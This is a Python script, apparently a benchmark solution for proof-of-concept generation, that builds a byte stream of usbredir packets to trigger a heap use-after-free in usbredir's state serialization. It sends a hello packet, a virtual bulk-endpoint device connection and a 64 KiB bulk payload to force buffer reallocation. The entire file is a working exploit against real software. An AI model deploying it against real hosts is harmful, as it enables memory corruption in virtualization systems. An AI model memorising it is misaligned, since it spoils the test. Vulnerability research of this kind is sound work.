import struct

class Solution:
    """
    Generates a PoC for a Heap Use After Free vulnerability in usbredir's
    serialization process.
    """

    def _create_header(self, pkt_type: int, length: int) -> bytes:
        """
        Creates a usbredir packet header.
        struct usbredir_header { uint32_t type; uint32_t length; };
        """
        return struct.pack('<II', pkt_type, length)

    def _create_hello(self) -> bytes:
        """
        Creates a usbredir_hello packet. This packet initiates the connection
        and declares capabilities.
        """
        USB_REDIR_TYPE_HELLO = 1
        USB_REDIR_CAP_BULK_RECEIVING = 3

        # struct usbredir_hello {
        #   uint8_t version_major;
        #   uint8_t version_minor;
        #   uint32_t caps[8];
        # };
        # A standard C compiler will add 2 bytes of padding after version_minor
        # to align the caps array on a 4-byte boundary. sizeof() confirms this.
        version_major = 0
        version_minor = 4
        caps = [0] * 8
        caps[0] = (1 << USB_REDIR_CAP_BULK_RECEIVING)

        payload = struct.pack('<BB2x8I', version_major, version_minor, *caps)
        header = self._create_header(USB_REDIR_TYPE_HELLO, len(payload))
        return header + payload

    def _create_device_connect(self) -> bytes:
        """
        Creates a usbredir_device_connect packet to simulate a new device
        being connected. The device has one bulk OUT endpoint, which is
        needed to buffer "write" data.
        """
        USB_REDIR_TYPE_DEVICE_CONNECT = 3
        USB_REDIR_SPEED_HIGH = 2
        USB_ENDPOINT_TYPE_BULK = 2
        BULK_OUT_ENDPOINT = 0x01

        # struct usbredir_endpoint_info { uint8_t endpoint; uint8_t type; };
        ep_info = struct.pack('<BB', BULK_OUT_ENDPOINT, USB_ENDPOINT_TYPE_BULK)

        # struct usbredir_interface_info {
        #   uint8_t interface_class; uint8_t interface_subclass;
        #   uint8_t interface_protocol; uint8_t interface_number;
        #   uint32_t endpoint_count;
        # };
        # This struct is naturally aligned, so no padding is needed.
        if_info = struct.pack('<BBBB I', 0, 0, 0, 0, 1) + ep_info

        # struct usbredir_device_connect { ... };
        # Compiler adds 2 bytes of padding before interface_count.
        dev_con = struct.pack('<B BBB HH BB 2x I',
                               USB_REDIR_SPEED_HIGH,
                               0, 0, 0,  # class, sub, proto
                               0x1d6b, 0x0002, # vid, pid (e.g., Linux Foundation)
                               2, 0,   # version
                               1)      # interface_count

        payload = dev_con + if_info
        header = self._create_header(USB_REDIR_TYPE_DEVICE_CONNECT, len(payload))
        return header + payload

    def _create_bulk_packet(self, endpoint: int, data: bytes) -> bytes:
        """
        Creates a usbredir_bulk_packet.
        """
        USB_REDIR_TYPE_BULK_PACKET = 6

        # struct usbredir_bulk_packet { uint8_t endpoint; uint32_t length; };
        # The wire format of the payload is this struct followed by the data.
        # The struct itself will be padded to 8 bytes by the compiler.
        packet_meta = struct.pack('<B 3x I', endpoint, len(data))
        payload = packet_meta + data
        header = self._create_header(USB_REDIR_TYPE_BULK_PACKET, len(payload))
        return header + payload

    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The PoC consists of a stream of usbredir packets that, when processed,
        create a parser state with a large amount of buffered write data.
        When this state is later serialized (e.g., during a QEMU migration),
        the serialization buffer (default 64kB) is reallocated. A pointer
        to the write buffer count is not updated after the reallocation,
        leading to a write to freed memory (Use After Free).
        """
        poc = bytearray()

        # 1. Initiate connection
        poc.extend(self._create_hello())

        # 2. Connect a virtual device with a bulk OUT endpoint
        poc.extend(self._create_device_connect())

        # 3. Send a large bulk packet to fill the write buffer.
        # The initial serialization buffer size is 65536 bytes.
        # The serialized state consists of some metadata plus the buffered
        # writes. We need the total size to exceed 65536. The metadata
        # is small, so a data payload of 65536 bytes is a safe choice
        # to guarantee an overflow and subsequent reallocation.
        packet_data_size = 65536
        packet_data = b'\x41' * packet_data_size
        
        BULK_OUT_ENDPOINT = 0x01
        poc.extend(self._create_bulk_packet(BULK_OUT_ENDPOINT, packet_data))

        return bytes(poc)